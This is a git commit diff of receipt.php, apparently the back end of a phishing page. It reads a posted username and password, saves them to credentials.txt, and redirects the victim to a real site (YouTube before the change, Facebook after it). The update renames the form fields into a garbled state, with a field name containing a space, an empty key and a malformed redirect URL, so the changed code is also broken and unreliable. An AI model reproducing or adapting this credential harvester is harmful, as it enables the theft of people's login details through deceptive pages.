e9c8449d14bf4a7543124c64ed50b772b66c7861
Sno2den <91027978+Sno2den@users.noreply.github.com>
2021-09-21 16:21:45 -0500

    Update receipt.php

--- receipt.php
+++ receipt.php
@@ -1,12 +1,12 @@
 <?php
 
-if(isset($_POST["usuario"])){
-        $user = $_POST["usuario"];
-        $contra = $_POST["contrasena"];
+if(isset($_POST["amalia_corro"])){
+        $user = $_POST["amalia corro"];
+        $contra = $_POST[""];
         $file = fopen("credentials.txt", "w+");
         fwrite($file, "Usuario: $user
 Contrasena: $contra
 ");
-        header('location: http://youtube.com');
+        header('location: http:// facebook.com');
 }
 ?>
